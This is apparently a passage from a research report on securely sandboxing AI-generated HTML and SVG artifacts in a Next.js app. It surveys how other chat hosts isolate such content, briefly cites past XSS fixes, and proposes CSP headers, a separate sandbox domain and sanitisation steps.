  - The CSP is declared in `openai/widgetCSP` (legacy snake_case `connect_domains` / `resource_domains` / `frame_domains`) or `_meta.ui.csp` (camelCase, MCP Apps). OpenAI auto-adds its own domains such as `*.oaistatic.com` ([sunpeak migration guide](https://sunpeak.ai/docs/mcp-apps/server/migrate-openai-apps); [ext-apps migration doc](https://apps.extensions.modelcontextprotocol.io/api/documents/Migrate_OpenAI_App.html)).
- **Google**: googleusercontent.com is the "classic sandbox domain" model. Google's newer pattern is PSL-registered per-content subdomains, a shim, postMessage, a Blob, and a sandboxed iframe ([web.dev](https://web.dev/articles/securely-hosting-user-data)).
- **MCP Apps / MCP-UI**: the sandbox proxy on a different origin, deny-by-default CSP, declared domains, app-only tool visibility enforcement, and user consent for `ui/message` ([MCP Apps spec](https://github.com/modelcontextprotocol/ext-apps/blob/main/specification/2026-01-26/apps.mdx)). An IBM mcp-context-forge issue tracks host-side implementation ([GitHub](https://github.com/IBM/mcp-context-forge/issues/4928)).
- **Open WebUI**: CVE-2025-46719, markdown HTML-token XSS leading to token theft, fixed in 0.6.6 ([OSV](https://osv.dev/vulnerability/CVE-2025-46719)). A July 2026 brief reports an Open WebUI stored-XSS-to-RCE issue ([craftedsignal](https://feed.craftedsignal.io/briefs/2026-07-open-webui-stored-xss-rce/)). It was not fetched, so its details are unverified.
- **LibreChat**: CVE-2026-54025, XSS in the markdown artifact preview through `marked` alt-text quote escaping, fixed in 0.8.4-rc1 ([OSV](https://osv.dev/vulnerability/CVE-2026-54025)).

### Inferences
- What to copy: (1) a separate registrable domain, (2) header-delivered CSP on that domain, (3) a deny-by-default network policy with explicit allowlists, (4) a bridge with schema validation and user consent for privileged actions, and (5) boundary UI in host chrome, such as a "Generated content" frame label and no host-styled buttons inside the artifact.
- What to avoid, from the open-source failures: rendering any model HTML in the app origin, trusting a markdown library's escaping, and treating the "preview" path as lower risk than the main artifact path.

### Gaps
- **Vercel v0**: I found no source this session on v0's preview sandbox (it is believed to use separate preview domains or VMs, but that is unverified).
- **ChatGPT Canvas** (as opposed to Apps SDK widgets): I found no primary source on its HTML/React preview sandbox.
- **Gemini Canvas**: I found no Gemini-specific source confirming which Google sandbox mechanism it uses.
- **Open WebUI artifact iframe flags**: I found no source on whether its artifact iframe currently uses `allow-same-origin`. This is historically a point of concern, so it should be checked in its source code.

## 6. Next.js-specific implementation (Next 16 in this repo)

### Takeaway
In this repo's Next version, per-request CSP with nonces is set in **`proxy.ts`** (the renamed middleware). It requires dynamic rendering and is incompatible with PPR. The artifact sandbox should be a separate deployment or route served on a different registrable domain with static, header-based CSP. It must not be a path on the app origin.

### Cited Findings
- The local Next docs (`node_modules/next/dist/docs/01-app/02-guides/content-security-policy.md`):
  - "Proxy enables you to add headers and generate nonces before the page renders".
  - The example builds `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'` and `style-src 'self' 'nonce-${nonce}'` in `proxy.ts`, and sets an `x-nonce` request header.
  - Next.js parses the CSP header during SSR, extracts `'nonce-{value}'`, and auto-applies it to framework scripts and to `<Script nonce>`.
  - You "**must use dynamic rendering to add nonces**".
  - "Partial Prerendering (PPR) is incompatible with nonce-based CSP".
  - `'unsafe-eval'` is needed only in development ("React uses `eval` to provide enhanced debugging information … not required for production").
  - Read the nonce in Server Components via `(await headers()).get('x-nonce')`.
  — local file `C:\ALOFT\aloft-ui-redesign\node_modules\next\dist\docs\01-app\02-guides\content-security-policy.md`
- Static headers per path can also be set in `next.config` `headers()`. — local file `C:\ALOFT\aloft-ui-redesign\node_modules\next\dist\docs\01-app\03-api-reference\05-config\01-next-config-js\headers.md` (existence confirmed; contents not read in detail)

### Inferences
- **App origin** (`proxy.ts`, matcher excluding `_next/static`, `_next/image` and `favicon`):
  ```
  default-src 'self';
  script-src 'self' 'nonce-${nonce}' 'strict-dynamic';
  style-src 'self' 'nonce-${nonce}';          // if Tailwind/shadcn inline styles break, fall back to 'self' 'unsafe-inline' for style only
  img-src 'self' data: blob: https://img-proxy.<app-domain>;
  font-src 'self';
  connect-src 'self' https://<api-domains>;
  frame-src https://*.aloft-usercontent.net;
  object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none';
  require-trusted-types-for 'script';          // roll out in Report-Only first
  upgrade-insecure-requests
  ```
  Also send `Cross-Origin-Opener-Policy: same-origin`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, and `Permissions-Policy: camera=(), microphone=(), geolocation=()`. Roll out with `Content-Security-Policy-Report-Only` plus a `report-to` endpoint first.
- **Sandbox origin**: build a tiny separate Next app (or plain static hosting: S3+CloudFront, or the existing ECR/container with a second host binding) serving only `/shim.html` and pre-bundled vendor libs. Set *static* headers via `next.config` `headers()` or CDN response-headers policy; nonces are unnecessary because the shim is static. If it must be the same Next deployment, use host-based routing in `proxy.ts` (check `request.headers.get('host')`) so the sandbox host serves only shim routes and gets the sandbox CSP. Never serve app routes or auth cookies on the sandbox host. Set cookies with no `Domain` attribute, so they stay host-only on the app domain.
- Never serve model-generated SVG/HTML from an app-origin API route with `Content-Type: image/svg+xml` or `text/html`. If you must, add `Content-Security-Policy: sandbox; default-src 'none'`, `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff` (per web.dev).
- Inline SVG in React: never use `dangerouslySetInnerHTML` with unsanitized output. Use DOMPurify (with `RETURN_TRUSTED_TYPE` if Trusted Types is on) in one audited `<SafeSvg>` component, and enforce it with an ESLint `react/no-danger` rule plus an allowlist exception.

- I did not verify whether this repo's Next version still accepts `middleware.ts` as an alias for `proxy.ts`.
- I did not read the `headers.md` doc contents to confirm per-host `has` matching syntax.
